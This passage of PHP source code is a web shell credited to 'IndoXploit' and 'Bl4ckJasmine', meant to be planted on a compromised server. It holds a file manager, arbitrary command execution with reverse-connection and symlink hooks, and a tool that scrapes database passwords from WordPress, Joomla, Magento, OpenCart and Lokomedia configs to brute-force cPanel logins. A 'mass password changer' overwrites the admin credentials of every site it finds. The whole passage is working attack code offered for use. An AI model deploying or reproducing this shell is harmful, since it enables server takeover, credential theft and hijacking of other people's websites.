ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=" . path() . "&file=" . $fileinfo['path'] . "'>$files</a></td>";
            print "<td class='td_home' style='text-align: center;'>" . $fileinfo['type'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $fileinfo['size'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $fileinfo['time'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $fileinfo['owner'] . DIRECTORY_SEPARATOR . $fileinfo['group'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $fileinfo['perms'] . "</td>";
            print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=" . path() . "&file=" . $fileinfo['path'] . "'>E</a> | <a href='?act=rename&dir=" . path() . "&file=" . $fileinfo['path'] . "'>R</a> | <a href='?act=delete&dir=" . path() . "&file=" . $fileinfo['path'] . "'>RM</a> | <a href='?act=download&dir=" . path() . "&file=" . $fileinfo['path'] . "'>D</a></td>";
            print "</tr>";
        }
        print "</table>";
        print "<br><i><center>&copy; " . color(1, 2, "IndoXploit") . " and mixed by " . color(6, 6, "Bl4ckJasmine") . "</i></a></center>";
    }
    function action() {
        tools("upload");
        tools("cmd");
        print "<center>";
        print "<ul>";
        print "<pre>----------------------------------------------</pre>";
        print "<font color='red'>[<a href='?'><font color='red'> ! </font></a>]</font> -";
        print " [ <a href='?dir=" . path() . "&njing=cpanel'><font color='gold'>CPANEL TOOLS</font></a> ] -";
        print " [ <a href='?dir=" . path() . "&njing=mpc'><font color='gold'>MASS PASS CHANGER</font></a> ] -";
        print "<font color='red'> [</font><a href='?'></a><font color='red'> ! </a>]</font>";
        print "<pre>----------------------------------------------</pre>";
        print "</ul>";
        print "</center>";
        if (isset($_GET['njing'])) {
            if ($_GET['njing'] === "cmd") {
                if (isset($_POST['cmd'])) {
                    if (preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
                        tools("readfile", $match[1]);
                    } elseif (preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
                        tools("spawn", $match[1]);
                    } elseif (preg_match("/^symlink$/", $_POST['cmd'], $match)) {
                        tools("symlink");
                    } elseif (preg_match("/^help$/", $_POST['cmd'], $match)) {
                        tools("help");
                    } elseif (preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
                        tools("network", $match[1]);
                    } elseif (preg_match("/^krdp$/", $_POST['cmd'])) {
                        tools("krdp");
                    } elseif (preg_match("/^jumping$/", $_POST['cmd'])) {
                        tools("jumping");
                    } elseif (preg_match("/^blackgrab$/", $_POST['cmd'])) {
                        tools("blackgrab");
                    } elseif (preg_match("/^logout$/", $_POST['cmd'])) {
                        unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
                        print "<script>window.location='?';</script>";
                    } elseif (preg_match("/^killme$/", $_POST['cmd'])) {
                        unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
                        @unlink(__FILE__);
                        print "<script>window.location='?';</script>";
                    } else {
                        print "<pre>" . exe($_POST['cmd']) . "</pre>";
                    }
                } else {
                    files_and_folder();
                }
            } elseif ($_GET['njing'] == 'cpanel') {
                if ($_POST['crack']) {
                    $usercp = explode("
", $_POST['user_cp']);
                    $passcp = explode("
", $_POST['pass_cp']);
                    $i = 0;
                    foreach ($usercp as $ucp) {
                        foreach ($passcp as $pcp) {
                            $connect = mysql_connect('localhost', $ucp, $pcp);
                            if ($connect) {
                                if ($_SESSION[$ucp] && $_SESSION[$pcp]) {
                                } else {
                                    $_SESSION[$ucp] = "1";
                                    $_SESSION[$pcp] = "1";
                                    if ($ucp === '' || $pcp === '') {
                                        //
                                        
                                    } else {
                                        $i++;
                                        print "username (" . color(1, 2, $ucp) . ") password (" . color(1, 2, $pcp) . ") domain (";
                                        if (!function_exists('posix_getpwuid')) print color(1, 1, "Function is Disable by System!");
                                        if (!getdomainname()) print color(1, 1, "Can't get domain name");
                                        foreach (getdomainname() as $domain) {
                                            $userdomain = (object)@posix_getpwuid(@fileowner("/etc/valiases/$domain"));
                                            $userdomain = $userdomain->name;
                                            if ($userdomain === $user) {
                                                print "<a href='http://$domain/' target='_blank'>" . color(1, 2, $domain) . "</a><br>";
                                                break;
                                            }
                                        }
                                        print (empty($domain)) ? color(1, 1, "Can't get domain name.") : color(1, 2, $domain);
                                        print ")<br>";
                                    }
                                }
                                mysql_close($connect);
                            }
                        }
                    }
                    print ($i === 0) ? "" : "<p>" . color(1, 3, "u found $i cPanel by Bl4ckJasmine") . "</p>";
                } else {
                    print "<center>
				
					   <form method='post'>
					   USER: <br>
					   <textarea style='width: 450px; height: 150px;' name='user_cp'>";
                    print implode("
", getuser());
                    print "</textarea><br>
					   PASS: <br>
					   <span>Grab Password from Link Config:</span><br>
					   <input style='width: 425px; background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='victim/blacksym/'>
					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='>>'>
					   <br>
					   <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
                    if (isset($_POST['submitlink'])) {
                        $getpass = $_POST['linkpass'];
                        $get = curl($_POST['linkpass']) ['response'];
                        preg_match_all('/<a href="(.*?).txt">/', $get, $link);
                        foreach ($link[1] as $link_config) {
                            $scandir[] = "$link_config.txt";
                        }
                    } else {
                        $getpass = path();
                        $scandir = scandir($getpass);
                    }
                    $password = "";
                    foreach ($scandir as $files) {
                        $file = "$getpass/$files";
                        $config = file_get_contents($file);
                        if (preg_match("/WordPress/", $config)) {
                            $password.= getValue($config, "DB_PASSWORD', '", "'") . "
";
                        } elseif (preg_match("/JConfig|joomla/", $config)) {
                            $password.= getValue($config, "password = '", "'") . "
";
                        } elseif (preg_match("/Magento|Mage_Core/", $config)) {
                            $password.= getValue($config, "<password><![CDATA[", "]]></password>") . "
";
                        } elseif (preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
                            $password.= getValue($config, 'password = "', '"') . "
";
                        } elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
                            $password.= getValue($config, "'DB_PASSWORD', '", "'") . "
";
                        } elseif (preg_match("/^[client]$/", $config)) {
                            preg_match("/password=(.*?)/", $config, $pass);
                            if (preg_match('/"/', $pass[1])) {
                                $pass[1] = str_replace('"', "", $pass[1]);
                                $password.= $pass[1] . "
";
                            } else {
                                $password.= $pass[1] . "
";
                            }
                        } elseif (preg_match("/cc_encryption_hash/", $config)) {
                            $password.= getValue($config, "db_password = '", "'") . "
";
                        }
                    }
                    print $password;
                    print "</textarea><br>
					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='crack' value='Crack'>
					   </form></center>";
                }
            } elseif ($_GET['njing'] == 'mpc') {
                if ($_POST['hajar']) {
                    if (strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
                        print "username atau password harus lebih dari 6 karakter";
                    } else {
                        $user_baru = $_POST['user_baru'];
                        $pass_baru = md5($_POST['pass_baru']);
                        $conf = $_POST['config_dir'];
                        if (preg_match("/^http:\/\//", $conf) OR preg_match("/^https:\/\//", $conf)) {
                            $get = curl($conf) ['response'];
                            preg_match_all('/<a href="(.*?).txt">/', $get, $link);
                            foreach ($link[1] as $link_config) {
                                $scan_conf[] = "$link_config.txt";
                            }
                        } else {
                            $scan_conf = scandir($conf);
                        }
                        foreach ($scan_conf as $file_conf) {
                            $config = file_get_contents("$conf/$file_conf");
                            if (preg_match("/JConfig|joomla/", $config)) {
                                $dbhost = getValue($config, "host = '", "'");
                                $dbuser = getValue($config, "user = '", "'");
                                $dbpass = getValue($config, "password = '", "'");
                                $dbname = getValue($config, "db = '", "'");
                                $dbprefix = getValue($config, "dbprefix = '", "'");
                                $prefix = $dbprefix . "users";
                                $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                                $db = mysql_select_db($dbname);
                                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                                $result = mysql_fetch_array($q);
                                $id = $result['id'];
                                $site = getValue($config, "sitename = '", "'");
                                $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                                print "Config => " . $file_conf . "<br>";
                                print "CMS => Joomla<br>";
                                if ($site == '') {
                                    print "Sitename => " . color(1, 1, "Can't get domain name") . "<br>";
                                } else {
                                    print "Sitename => $site<br>";
                                }
                                if (!$update OR !$conn OR !$db) {
                                    print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
                                } else {
                                    print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
                                }
                                mysql_close($conn);
                            } elseif (preg_match("/WordPress/", $config)) {
                                $dbhost = getValue($config, "DB_HOST', '", "'");
                                $dbuser = getValue($config, "DB_USER', '", "'");
                                $dbpass = getValue($config, "DB_PASSWORD', '", "'");
                                $dbname = getValue($config, "DB_NAME', '", "'");
                                $dbprefix = getValue($config, "table_prefix  = '", "'");
                                $prefix = $dbprefix . "users";
                                $option = $dbprefix . "options";
                                $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                                $db = mysql_select_db($dbname);
                                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                                $result = mysql_fetch_array($q);
                                $id = $result[ID];
                                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                                $result2 = mysql_fetch_array($q2);
                                $target = $result2[option_value];
                                if ($target == '') {
                                    $url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
                                } else {
                                    $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                                }
                                $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                                print "Config => " . $file_conf . "<br>";
                                print "CMS => Wordpress<br>";
                                print $url_target;
                                if (!$update OR !$conn OR !$db) {
                                    print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
                                } else {
                                    print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
                                }
                                mysql_close($conn);
                            } elseif (preg_match("/Magento|Mage_Core/", $config)) {
                                $dbhost = getValue($config, "<host><![CDATA[", "]]></host>");
                                $dbuser = getValue($config, "<username><![CDATA[", "]]></username>");
                                $dbpass = getValue($config, "<password><![CDATA[", "]]></password>");
                                $dbname = getValue($config, "<dbname><![CDATA[", "]]></dbname>");
                                $dbprefix = getValue($config, "<table_prefix><![CDATA[", "]]></table_prefix>");
                                $prefix = $dbprefix . "admin_user";
                                $option = $dbprefix . "core_config_data";
                                $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                                $db = mysql_select_db($dbname);
                                $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                                $result = mysql_fetch_array($q);
                                $id = $result[user_id];
                                $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                                $result2 = mysql_fetch_array($q2);
                                $target = $result2[value];
                                if ($target == '') {
                                    $url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
                                } else {
                                    $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                                }
                                $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                                print "Config => " . $file_conf . "<br>";
                                print "CMS => Magento<br>";
                                print $url_target;
                                if (!$update OR !$conn OR !$db) {
                                    print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
                                } else {
                                    print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
                                }
                                mysql_close($conn);
                            } elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
                                $dbhost = getValue($config, "'DB_HOSTNAME', '", "'");
                                $dbuser = getValue($config, "'DB_USERNAME', '", "'");
                                $dbpass = getValue($config, "'DB_PASSWORD', '", "'");
                                $dbname = getValue($config, "'DB_DATABASE', '", "'");
                                $dbprefix = getValue($config, "'DB_PREFIX', '", "'");
                                $prefix = $dbprefix . "user";
                                $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                                $db = mysql_select_db($dbname);
                                $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                                $result = mysql_fetch_array($q);
                                $id = $result[user_id];
                                $target = getValue($config, "HTTP_SERVER', '", "'");
                                if ($target == '') {
                                    $url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
                                } else {
                                    $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                                }
                                $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                                print "Config => " . $file_conf . "<br>";
                                print "CMS => OpenCart<br>";
                                print $url_target;
                                if (!$update OR !$conn OR !$db) {
                                    print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
                                } else {
                                    print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
                                }
                                mysql_close($conn);
                            } elseif (preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
                                $dbhost = getValue($config, 'server = "', '"');
                                $dbuser = getValue($config, 'username = "', '"');
                                $dbpass = getValue($config, 'password = "', '"');
                                $dbname = getValue($config, 'database = "', '"');
                                $prefix = "users";
                                $option = "identitas";
                                $conn = mysql_connect($dbhost, $dbuser, $dbpass);
                                $db = mysql_select_db($dbname);
                                $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                                $result = mysql_fetch_array($q);
                                $target = $result[alamat_website];
                                if ($target == '') {
                                    $target2 = $result[url];
                                    $url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
                                    if ($target2 == '') {
                                        $url_target2 = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
                                    } else {
                                        $cek_login3 = file_get_contents("$target2/adminweb/");
                                        $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                                        if (preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                            $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                                        } elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                            $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                                        } else {
                                            $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                        }
                                    }
                                } else {
                                    $cek_login = file_get_contents("$target/adminweb/");
                                    $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                                    if (preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                                        $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                                    } elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                                        $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                                    } else {
                                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                                    }
                                }
                                $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                                print "Config => " . $file_conf . "<br>";
                                print "CMS => Lokomedia<br>";
                                if (preg_match("/Can't get domain name/", $url_target)) {
                                    print $url_target2;
                                } else {
                                    print $url_target;
                                }
                                if (!$update OR !$conn OR !$db) {
                                    print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
                                } else {
                                    print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
                                }
                                mysql_close($conn);
                            }
                        }
                    }
                } else {
                    print "<center>
				<h1>Mass Password Change</h1>
				<form method='post'>
				<input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
				<input type='text' size='50' name='config_dir' value='" . path() . "'><br><br>
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='bl4ckjasmine' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='bl4ckjasmine' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value=' execute '>
				</form></center>";
                }
            }
        } elseif (isset($_GET['act'])) {
            if ($_GET['act'] === 'newfile') {
                if ($_POST['save']) {
                    $filename = htmlspecialchars($_POST['filename']);
                    $fopen = fopen($filename, "a+");
                    if ($fopen) {
                        $act = "<script>window.location='?act=edit&dir=" . path() . "&file=" . $_POST['filename'] . "';</script>";
                    } else {
                        $act = color(1, 1, "Permission Denied!");
                    }
                }
                print $act;
                print "<form method='post'>
			Filename: <input type='text' name='filename' value='" . path() . "/newfile.php' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
            } elseif ($_GET['act'] === 'newfolder') {
                if ($_POST['save']) {
                    $foldername = path() . '/' . htmlspecialchars($_POST['foldername']);
                    if (!@mkdir($foldername)) {
                        $act = color(1, 1, "Permission Denied!");
                    } else {
                        $act = "<script>window.location='?dir=" . path() . "';</script>";
                    }
                }
                print $act;
                print "<form method='post'>
			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
            } elseif ($_GET['act'] === 'rename_folder') {
                if ($_POST['save']) {
                    $rename_folder = rename(path(), "" . dirname(path()) . DIRECTORY_SEPARATOR . htmlspecialchars($_POST['foldername']));
                    if ($rename_folder) {
                        $act = "<script>window.location='?dir=" . dirname(path()) . "';</script>";
                    } else {
                        $act = color(1, 1, "Permission Denied!");
                    }
                    print "$act<br>";
                }
                print "<form method='post'>
			<input type='text' value='" . basename(path()) . "' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
            } elseif ($_GET['act'] === 'delete_folder') {
                if (is_dir(path())) {
                    if (is_writable(path())) {
                        @rmdir(path());
                        if (!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf " . path());
                        if (!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q " . path());
                        $act = "<script>window.location='?dir=" . dirname(path()) . "';</script>";
                    } else {
                        $act = color(1, 1, "Could not remove directory '" . basename(path()) . "'");
                    }
                }
                print $act;
            } elseif ($_GET['act'] === 'view') {
                print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
                print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'><b>view</b></a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
                print "<textarea readonly>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea>";
            } elseif ($_GET['act'] === 'edit') {
                if ($_POST['save']) {
                    $save = file_put_contents($_GET['file'], $_POST['src']);
                    if ($save) {
                        $act = color(1, 2, "File Saved!");
                    } else {
                        $act = color(1, 1, "Permission Denied!");
                    }
                    print "$act<br>";
                }
                print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
                print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'><b>edit</b></a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
                print "<form method='post'>
			<textarea name='src'>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea><br>
			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
			</form>";
            } elseif ($_GET['act'] === 'rename') {
                if ($_POST['save']) {
                    $rename = rename($_GET['file'], path() . DIRECTORY_SEPARATOR . htmlspecialchars($_POST['filename']));
                    if ($rename) {
                        $act = "<script>window.location='?dir=" . path() . "';</script>";
                    } else {
                        $act = color(1, 1, "Permission Denied!");
                    }
                    print "$act<br>";
                }
                print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
                print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'><b>rename</b></a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
                print "<form method='post'>
			<input type='text' value='" . basename($_GET['file']) . "' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
            } elseif ($_GET['act'] === 'delete') {
                $delete = unlink($_GET['file']);
                if ($delete) {
                    $act = "<script>window.location='?dir=" . path() . "';</script>";
                } else {
                    $act = color(1, 1, "Permission Denied!");
                }
                print $act;
            }
        } else {
            files_and_folder();
        }
    }
    serverinfo();
    action();
?>
</body>
</html>
